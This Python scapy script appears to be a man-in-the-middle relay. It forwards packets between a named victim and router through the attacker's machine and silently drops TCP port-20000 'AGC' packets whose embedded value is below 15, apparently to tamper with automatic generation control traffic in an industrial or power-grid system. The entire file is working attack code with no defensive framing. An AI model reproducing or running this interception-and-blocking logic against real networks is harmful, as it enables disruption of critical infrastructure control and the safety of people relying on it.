from bitstring import BitArray
from scapy.all import *
from uuid import getnode as get_mac
from calc_crc import calc_crc_chksum
from helpers import *
import argparse
import signal
import sys
import logging
import time
s = conf.L2socket(iface='eth0')
victimIP=""
routerIP=""
victimMAC=""
routerMAC=""
myMAC=""
interface=""
def parse_args():
	parser = argparse.ArgumentParser()
	parser.add_argument("-v", "--victimIP", help="Choose the victim IP address. Example: -v 192.168.0.5")
	parser.add_argument("-r", "--routerIP", help="Choose the router IP address. Example: -r 192.168.0.1")
	parser.add_argument("-vmac", "--victimMAC", help="Choose the victim MAC address. Example: -vmac 00:11:22:33:44:55")
	parser.add_argument("-rmac", "--routerMAC", help="Choose the router MAC address. Example: -rmac 11:22:33:44:55:66")
	parser.add_argument("-mmac", "--myMAC", help="my (attacker) MAC. Example: -mmac 11:22:33:44:55:66")
	parser.add_argument("-i", "--interface", help="interface to listen on Example: eth0")
	return parser.parse_args()

def callback(pkt):
	block = False
	#modify packet here
        if("TCP" in pkt and "Raw" in pkt):
		if(pkt[TCP].sport==20000 or pkt[TCP].dport==20000):
			payload = pkt[Raw].load

			if(len(payload)>=21):
				if(payload[12] == '\x05'):
					value = payload[18:22]
					value = hex_to_float(value)
					if(value < 15):
						block = True
						print "Blocked AGC packet with value: "+str(value)

	if(pkt[IP].dst == victimIP and pkt.dst == myMAC and block == False):
		pkt.dst=victimMAC
		pkt.src=myMAC
		#fragments large packets
		if(len(pkt) > 1514):
			#print len(pkt)
			pkt = fragment(pkt)
			for p in pkt:
				s.send(p)
		else:
			s.send(pkt)
	elif(pkt[IP].dst == routerIP and pkt.dst == myMAC and block == False):
		pkt.dst=routerMAC
		pkt.src=myMAC
		#fragments large packets
		if(len(pkt) > 1514):
			#print len(pkt)
			pkt = fragment(pkt)
			for p in pkt:
				s.send(p)
		else:
			s.send(pkt)

def main(args):
	if os.geteuid() != 0:
		sys.exit("[!] Please run as root")
	global routerIP
	global victimIP
	global routerMAC
	global victimMAC
	global myMAC
	global interface
	routerIP= args.routerIP
	victimIP = args.victimIP
	routerMAC = args.routerMAC
	victimMAC = args.victimMAC
	if(routerMAC == None):
		routerMAC = get_mac_from_ip(routerIP)
	if(victimMAC == None):
		victimMAC = get_mac_from_ip(victimIP)
	myMAC = args.myMAC
	if(myMAC == None):
		myMAC = get_my_mac()
	interface = args.interface
	if(interface == None):
		interface = "eth0"
	print "Forwarding for router ---> IP: "+routerIP+"  Mac Address: "+routerMAC
	print "Forwarding for victim ---> IP: "+victimIP+"  Mac Address: "+victimMAC
	filter_text = "ip and ether dst host " + myMAC + " and(dst net " + victimIP  + " or dst net " + routerIP  + ")"
	sniff(filter=filter_text, prn=callback, store=0, iface=interface)
main(parse_args())



